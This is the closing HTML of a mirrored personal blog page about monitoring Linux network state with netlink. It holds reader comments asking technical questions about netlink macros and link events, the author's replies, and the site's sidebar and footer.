+                                         <span class="posted-date">June 9, 2023</span>
+                                   </div><!-- .news-text-wrap -->
+                                </div><!-- .news-item -->
+
+                                  
+
+                                <div class="news-item three-column-item">
+                                    <div class="news-thumb">
+                                        <a href="../../../../2023/03/18/reworking-gen2-starlink-router-from-spx-connector-to-8p8c-rj45/index.html"></a>   
+                                    </div><!-- .news-thumb --> 
+
+                                   <div class="news-text-wrap">
+                                        <h2><a href="../../../../2023/03/18/reworking-gen2-starlink-router-from-spx-connector-to-8p8c-rj45/index.html">Reworking Gen2 Starlink router from SPX connector to 8P8C (RJ45)</a></h2>
+                                         <span class="posted-date">March 18, 2023</span>
+                                   </div><!-- .news-text-wrap -->
+                                </div><!-- .news-item -->
+
+                                                        </div>
+
+                    </div>
+                     
+                    
+            <div class="author-info-wrap">
+
+                <div class="author-thumb">
+                    <img alt='' src='https://secure.gravatar.com/avatar/71a690f51f8d15d23a235b9bd07140c4?s=100&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/71a690f51f8d15d23a235b9bd07140c4?s=200&#038;d=mm&#038;r=g 2x' class='avatar avatar-100 photo' height='100' width='100' decoding='async'/>                </div>
+
+                <div class="author-content-wrap">
+                    
+                    <div class="author-header">
+                        <h3 class="author-name">About Oleg Kutkov</h3>
+                    </div><!-- .author-header -->
+
+                    <div class="author-content">
+                        <div class="author-desc"></div>
+                        <a class="authors-more-posts" href="../../../../author/oleg_kutkov/index.html">View all posts by Oleg Kutkov &rarr;</a>
+                    </div><!-- .author-content -->
+                    
+                </div>
+                
+            </div>
+                     
+            
+	<nav class="navigation post-navigation" aria-label="Posts">
+		<h2 class="screen-reader-text">Post navigation</h2>
+		<div class="nav-links"><div class="nav-previous"><a href="../../../../2017/11/02/listening-aircrafts-receiving-images-satellites/index.html" rel="prev">Listening to aircrafts and receiving images from the satellites</a></div><div class="nav-next"><a href="../isolated-eqmod-adapter-telescope-control/index.html" rel="next">Isolated eqmod adapter for the telescope control</a></div></div>
+	</nav>
+<div id="comments" class="comments-area">
+
+			<h2 class="comments-title">
+			10 thoughts on &ldquo;<span>Monitoring Linux networking state using netlink</span>&rdquo;		</h2>
+
+		
+		<ol class="comment-list">
+					<li id="comment-43" class="comment even thread-even depth-1 parent">
+			<article id="div-comment-43" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/71f831c5b8d2c000af41fd5e12d57497?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/71f831c5b8d2c000af41fd5e12d57497?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">io</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-43"><time datetime="2019-03-03T20:53:24+02:00">March 3, 2019 at 8:53 pm</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Thanks for the article!<br />
+There are a few weird not documented macros directly from linux kernel &#8211; how did you figure out what they are supposed to do? Seems like the only way to work with netlink without libs like libnl is to debug and pull things from iproute2&#8230;</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='indexf73b.html?replytocom=43#respond' data-commentid="43" data-postid="250" data-belowelement="div-comment-43" data-respondelement="respond" data-replyto="Reply to io" aria-label='Reply to io'>Reply</a></div>			</article><!-- .comment-body -->
+		<ol class="children">
+		<li id="comment-44" class="comment byuser comment-author-oleg_kutkov bypostauthor odd alt depth-2">
+			<article id="div-comment-44" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/71a690f51f8d15d23a235b9bd07140c4?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/71a690f51f8d15d23a235b9bd07140c4?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn"><a href="../../../../index.html" class="url" rel="ugc">Oleg Kutkov</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-44"><time datetime="2019-03-03T21:48:37+02:00">March 3, 2019 at 9:48 pm</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Hello! Yep, I spent a lot of the time trying to figure out how it supposed to work.<br />
+I digged into the kernel and iproute2 sources, debugging and experimenting.</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='index39ab.html?replytocom=44#respond' data-commentid="44" data-postid="250" data-belowelement="div-comment-44" data-respondelement="respond" data-replyto="Reply to Oleg Kutkov" aria-label='Reply to Oleg Kutkov'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+		<li id="comment-48" class="pingback even thread-odd thread-alt depth-1">
+			<div class="comment-body">
+				Pingback: <a href="../../../../2019/03/24/getting-linux-routing-table-using-netlink/index.html" class="url" rel="ugc">Getting Linux routing table using netlink. - Oleg Kutkov personal blog</a> 			</div>
+		</li><!-- #comment-## -->
+		<li id="comment-50" class="comment odd alt thread-even depth-1 parent">
+			<article id="div-comment-50" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/d61eddde3e6e93cc64170ec46388ec47?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/d61eddde3e6e93cc64170ec46388ec47?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">dmytro</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-50"><time datetime="2019-04-10T16:53:01+03:00">April 10, 2019 at 4:53 pm</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Hello Oleg,<br />
+I would be grateful if you checked this SO question<br />
+<a href="https://stackoverflow.com/questions/55614270/how-to-asynchronously-check-if-an-ipv6-netwrok-interface-changes-state-from-tent" rel="nofollow ugc">https://stackoverflow.com/questions/55614270/how-to-asynchronously-check-if-an-ipv6-netwrok-interface-changes-state-from-tent</a></p>
+<p>and if possible provided answers/ideas, etc.<br />
+Thanks in advance!!!</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='indexed49.html?replytocom=50#respond' data-commentid="50" data-postid="250" data-belowelement="div-comment-50" data-respondelement="respond" data-replyto="Reply to dmytro" aria-label='Reply to dmytro'>Reply</a></div>			</article><!-- .comment-body -->
+		<ol class="children">
+		<li id="comment-51" class="comment byuser comment-author-oleg_kutkov bypostauthor even depth-2">
+			<article id="div-comment-51" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/71a690f51f8d15d23a235b9bd07140c4?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/71a690f51f8d15d23a235b9bd07140c4?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn"><a href="../../../../index.html" class="url" rel="ugc">Oleg Kutkov</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-51"><time datetime="2019-04-11T01:00:16+03:00">April 11, 2019 at 1:00 am</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Hello.<br />
+Please check out my answer on the Stack Overflow.</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='index740f.html?replytocom=51#respond' data-commentid="51" data-postid="250" data-belowelement="div-comment-51" data-respondelement="respond" data-replyto="Reply to Oleg Kutkov" aria-label='Reply to Oleg Kutkov'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+		<li id="comment-883" class="comment odd alt thread-odd thread-alt depth-1">
+			<article id="div-comment-883" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/93dd9c17f6fa8ecde00819fa6d3de011?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/93dd9c17f6fa8ecde00819fa6d3de011?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">Puneet Sharma</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-883"><time datetime="2020-07-16T16:53:35+03:00">July 16, 2020 at 4:53 pm</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Nice article.<br />
+Very useful to jumpstart understanding netlink sockets.<br />
+Thank you.</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='index6e4c.html?replytocom=883#respond' data-commentid="883" data-postid="250" data-belowelement="div-comment-883" data-respondelement="respond" data-replyto="Reply to Puneet Sharma" aria-label='Reply to Puneet Sharma'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+		<li id="comment-943" class="comment even thread-even depth-1">
+			<article id="div-comment-943" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/6e8df8e016751fa63edf0cbce41ccbec?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/6e8df8e016751fa63edf0cbce41ccbec?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">shahriar</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-943"><time datetime="2020-11-05T12:06:41+02:00">November 5, 2020 at 12:06 pm</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>NLMSG_DATA(h) is first casted to ifinfomsg and then ifaddrmsg in your code. Can you explain how it works? I thought we have ifinfomsg in case of NEW_LINK,DEL_LINK and ifaddrmsg in case of NEW_ADDR and DEL_ADDR</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='index40d3.html?replytocom=943#respond' data-commentid="943" data-postid="250" data-belowelement="div-comment-943" data-respondelement="respond" data-replyto="Reply to shahriar" aria-label='Reply to shahriar'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+		<li id="comment-948" class="comment odd alt thread-odd thread-alt depth-1">
+			<article id="div-comment-948" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/6e8df8e016751fa63edf0cbce41ccbec?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/6e8df8e016751fa63edf0cbce41ccbec?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">Shahriar Basiri</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-948"><time datetime="2020-11-07T09:30:45+02:00">November 7, 2020 at 9:30 am</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Hello Oleg,<br />
+   Another question dear Oleg:). In function parseRtattr(), &#8220;h-&gt;nlmsg_len&#8221; is passed as &#8220;len&#8221; where it is the size of whole netlink message (nlmsghdr+ifinfomsg/ifaddrmsg+rtattrs). Then, this len is checked in RTA_OK and updated in RTA_NEXT macros. I think this size should be just size of rtattrs so that RTA_OK be valid.</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='index61a3.html?replytocom=948#respond' data-commentid="948" data-postid="250" data-belowelement="div-comment-948" data-respondelement="respond" data-replyto="Reply to Shahriar Basiri" aria-label='Reply to Shahriar Basiri'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+		<li id="comment-1038" class="comment even thread-even depth-1">
+			<article id="div-comment-1038" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/73e448a5d161cd4f29f096960c01cdbe?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/73e448a5d161cd4f29f096960c01cdbe?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">Venkateswaran</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-1038"><time datetime="2021-05-07T00:35:27+03:00">May 7, 2021 at 12:35 am</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>RTM_DELLINK event is not triggered in any case. Do you know why ? I thought it ll be triggered when I remove my cable but not</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='indexf011.html?replytocom=1038#respond' data-commentid="1038" data-postid="250" data-belowelement="div-comment-1038" data-respondelement="respond" data-replyto="Reply to Venkateswaran" aria-label='Reply to Venkateswaran'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+		<li id="comment-1370" class="comment odd alt thread-odd thread-alt depth-1">
+			<article id="div-comment-1370" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/e12ac1e53173a88d4701c157c5673743?s=32&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/e12ac1e53173a88d4701c157c5673743?s=64&#038;d=mm&#038;r=g 2x' class='avatar avatar-32 photo' height='32' width='32' loading='lazy' decoding='async'/>						<b class="fn">Pragya Nand</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-1370"><time datetime="2022-09-07T16:31:11+03:00">September 7, 2022 at 4:31 pm</time></a>					</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Hi Oleg,<br />
+Thanks for such an informative blogpost on netlink.<br />
+Is there any specific post related on how to access nested attribute such as IFLA_LINKINFO.</p>
+				</div><!-- .comment-content -->
+
+				<div class="reply"><a rel='nofollow' class='comment-reply-link' href='index3bfb.html?replytocom=1370#respond' data-commentid="1370" data-postid="250" data-belowelement="div-comment-1370" data-respondelement="respond" data-replyto="Reply to Pragya Nand" aria-label='Reply to Pragya Nand'>Reply</a></div>			</article><!-- .comment-body -->
+		</li><!-- #comment-## -->
+		</ol><!-- .comment-list -->
+
+			<div id="respond" class="comment-respond">
+		<h3 id="reply-title" class="comment-reply-title">Leave a Reply to <a href="#comment-51">Oleg Kutkov</a> <small><a rel="nofollow" id="cancel-comment-reply-link" href="index.html#respond">Cancel reply</a></small></h3><form action="https://olegkutkov.me/wp-comments-post.php" method="post" id="commentform" class="comment-form" novalidate><p class="comment-notes"><span id="email-notes">Your email address will not be published.</span> <span class="required-field-message">Required fields are marked <span class="required">*</span></span></p><p class="comment-form-comment"><label for="comment">Comment <span class="required">*</span></label> <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" required></textarea></p><p class="comment-form-author"><label for="author">Name <span class="required">*</span></label> <input id="author" name="author" type="text" value="" size="30" maxlength="245" autocomplete="name" required /></p>
+<p class="comment-form-email"><label for="email">Email <span class="required">*</span></label> <input id="email" name="email" type="email" value="" size="30" maxlength="100" aria-describedby="email-notes" autocomplete="email" required /></p>
+<p class="comment-form-url"><label for="url">Website</label> <input id="url" name="url" type="url" value="" size="30" maxlength="200" autocomplete="url" /></p>
+<p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="Post Comment" /> <input type='hidden' name='comment_post_ID' value='250' id='comment_post_ID' />
+<input type='hidden' name='comment_parent' id='comment_parent' value='51' />
+</p><p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="d1d3480f5d" /></p><p style="display: none !important;" class="akismet-fields-container" data-prefix="ak_"><label>&#916;<textarea name="ak_hp_textarea" cols="45" rows="8" maxlength="100"></textarea></label><input type="hidden" id="ak_js_1" name="ak_js" value="9"/><script>document.getElementById( "ak_js_1" ).setAttribute( "value", ( new Date() ).getTime() );</script></p></form>	</div><!-- #respond -->
+	<p class="akismet_comment_form_privacy_notice">This site uses Akismet to reduce spam. <a href="https://akismet.com/privacy/" target="_blank" rel="nofollow noopener">Learn how your comment data is processed</a>.</p>
+</div><!-- #comments -->
+
+</main><!-- #main --></div><!-- #primary --></div><!-- .col-md-8 --><div class="col-md-4 col-sm-12 main-sidebar">
+	<aside id="secondary" class="widget-area" role="complementary">
+		<section id="categories-2" class="widget widget_categories"><h3 class="widget-title">Categories</h3>
+			<ul>
+					<li class="cat-item cat-item-4"><a href="../../../../category/allsky-camera/index.html">Allsky camera</a> (5)
+</li>
+	<li class="cat-item cat-item-11"><a href="../../../../category/astro-tools/index.html">Astro tools</a> (9)
+</li>
+	<li class="cat-item cat-item-121"><a href="../../../../category/automotive/index.html">Automotive</a> (2)
+</li>
+	<li class="cat-item cat-item-30"><a href="../../../../category/electronics/index.html">Electronics</a> (34)
+</li>
+	<li class="cat-item cat-item-111"><a href="../../../../category/firmware/index.html">Firmware</a> (3)
+</li>
+	<li class="cat-item cat-item-122"><a href="../../../../category/hardware/index.html">hardware</a> (12)
+</li>
+	<li class="cat-item cat-item-76"><a href="../../../../category/linux-kernel/index.html">Linux kernel</a> (8)
+</li>
+	<li class="cat-item cat-item-25"><a href="../../../../category/linux-system-development/index.html">Linux system development</a> (11)
+</li>
+	<li class="cat-item cat-item-78"><a href="../../../../category/networking/index.html">Networking</a> (12)
+</li>
+	<li class="cat-item cat-item-15"><a href="../../../../category/radio-antennas/index.html">Radio &amp; antennas</a> (16)
+</li>
+	<li class="cat-item cat-item-69"><a href="../../../../category/radioastronomy/index.html">Radioastronomy</a> (5)
+</li>
+	<li class="cat-item cat-item-110"><a href="../../../../category/reverse-engineering/index.html">Reverse engineering</a> (7)
+</li>
+	<li class="cat-item cat-item-54"><a href="../../../../category/software/index.html">Software</a> (18)
+</li>
+	<li class="cat-item cat-item-146"><a href="../../../../category/starlink/index.html">starlink</a> (1)
+</li>
+	<li class="cat-item cat-item-1"><a href="../../../../category/uncategorized/index.html">Uncategorized</a> (1)
+</li>
+			</ul>
+
+			</section>
+		<section id="recent-posts-2" class="widget widget_recent_entries">
+		<h3 class="widget-title">Recent Posts</h3>
+		<ul>
+											<li>
+					<a href="../../../../2024/02/12/starlink-terminal-revision-4-overview-and-tests/index.html">Starlink terminal revision 4: overview and tests</a>
+									</li>
+											<li>
+					<a href="../../../../2023/11/07/connecting-external-gps-antenna-to-the-starlink-terminal/index.html">Connecting external GPS antenna to the Starlink terminal</a>
+									</li>
+											<li>
+					<a href="../../../../2023/06/09/how-to-power-starlink-terminal-from-12v-without-poe-injector-and-dc-dc-converters/index.html">How to power Starlink terminal from 12V without PoE injector and DC/DC converters</a>
+									</li>
+											<li>
+					<a href="../../../../2023/03/18/reworking-gen2-starlink-router-from-spx-connector-to-8p8c-rj45/index.html">Reworking Gen2 Starlink router from SPX connector to 8P8C (RJ45)</a>
+									</li>
+											<li>
+					<a href="../../../../2022/07/18/data-logger-for-uni-t-ut800-multimeters/index.html">Data logger for UNI-T UT800 multimeters</a>
+									</li>
+					</ul>
+
+		</section><section id="recent-comments-2" class="widget widget_recent_comments"><h3 class="widget-title">Recent Comments</h3><ul id="recentcomments"><li class="recentcomments"><span class="comment-author-link">Christian Borrman</span> on <a href="../../../../2024/02/12/starlink-terminal-revision-4-overview-and-tests/index.html#comment-4178">Starlink terminal revision 4: overview and tests</a></li><li class="recentcomments"><span class="comment-author-link">Christian Borrman</span> on <a href="../../../../2024/02/12/starlink-terminal-revision-4-overview-and-tests/index.html#comment-4177">Starlink terminal revision 4: overview and tests</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://br/" class="url" rel="ugc external nofollow">Baú</a></span> on <a href="../../../../2023/11/07/connecting-external-gps-antenna-to-the-starlink-terminal/index.html#comment-4176">Connecting external GPS antenna to the Starlink terminal</a></li><li class="recentcomments"><span class="comment-author-link">sk</span> on <a href="../../../../2021/01/07/writing-a-pci-device-driver-for-linux/index.html#comment-4152">Writing a PCI device driver for Linux</a></li><li class="recentcomments"><span class="comment-author-link"><a href="http://zkitszo.blogspot.com/" class="url" rel="ugc external nofollow">Zkitszo</a></span> on <a href="../../../../2020/06/17/combining-two-hackrf-sdr-to-see-more/index.html#comment-4137">Combining two HackRF SDR to see more</a></li></ul></section><section id="nav_menu-6" class="widget widget_nav_menu"><h3 class="widget-title">Oleg Kutkov personal blog</h3><div class="menu-about-me-container"><ul id="menu-about-me" class="menu"><li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-218"><a href="../../../../index.html">Home</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2937"><a href="../../../../starlink-repairs-archive/index.html">Starlink repairs archive</a></li>
+<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2978"><a href="../../../../olegkutkov_public_key.txt">Public PGP</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3140"><a href="../../../../license/index.html">License</a></li>
+<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-219"><a href="../../../../about-me/index.html">About me</a></li>
+</ul></div></section><section id="search-4" class="widget widget_search"><h3 class="widget-title">Site search</h3><form role="search" method="get" class="search-form" action="https://olegkutkov.me/">
+				<label>
+					<span class="screen-reader-text">Search for:</span>
+					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
+				</label>
+				<input type="submit" class="search-submit" value="Search" />
+			</form></section><section id="block-2" class="widget widget_block"><h4>Support author</h4>
+<br>
+You can send donations on <a href="https://www.paypal.com/myaccount/transfer/homepage">PayPal</a> using my email contact@olegkutkov.me
+<br><br>
+Thank you for your support!</section><section id="block-4" class="widget widget_block"><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img decoding="async" alt="Creative Commons License" style="border-width:0" src="../../../../../licensebuttons.net/l/by/4.0/80x15.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a></section>	</aside><!-- #secondary -->
+</div></div><!-- .row --></div><!-- .container --></div><!-- #content -->
+	<footer id="colophon" class="site-footer" role="contentinfo">
+		<div class="site-info"><div class="container"><div class="row"> 
+        <div class="col-md-6 col-sm-6">
+            
+                <div class="copyright-text">
+
+                    Oleg Kutkov
+                </div>
+
+                 
+        </div>
+         
+        <div class="col-md-6 col-sm-6">     
+            <div class="credit-text">             
+                Blog Way by <a href="https://www.prodesigns.com/" rel="designer" target="_blank">ProDesigns</a>            </div>
+        </div>
+        </div><!-- .row --></div><!-- .container --></div><!-- .site-info -->	</footer><!-- #colophon -->
+
+</div><!-- #page -->
+
+<!--
+The IP2Location Country Blocker is using IP2Location LITE geolocation database. Please visit https://lite.ip2location.com for more information.
+-->
+<a href="#page" class="scrollup" id="btn-scrollup"><i class="fa fa-angle-up"></i></a><script type="text/javascript" id="code-prettify-js-before">
+/* <![CDATA[ */
+var codePrettifyLoaderBaseUrl = "index740f.html\/\/olegkutkov.me\/wp-content\/plugins\/code-prettify\/prettify";
+/* ]]> */
+</script>
+
+
+
+
+
+
+
+
+<script defer src="../../../../wp-content/cache/autoptimize/js/autoptimize_1827c9da4c86fc3ad9db01f6a6132235.js"></script></body>
+
+<!-- Mirrored from olegkutkov.me/2018/02/14/monitoring-linux-networking-state-using-netlink/?replytocom=51 by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 22 May 2024 19:17:09 GMT -->
+</html>
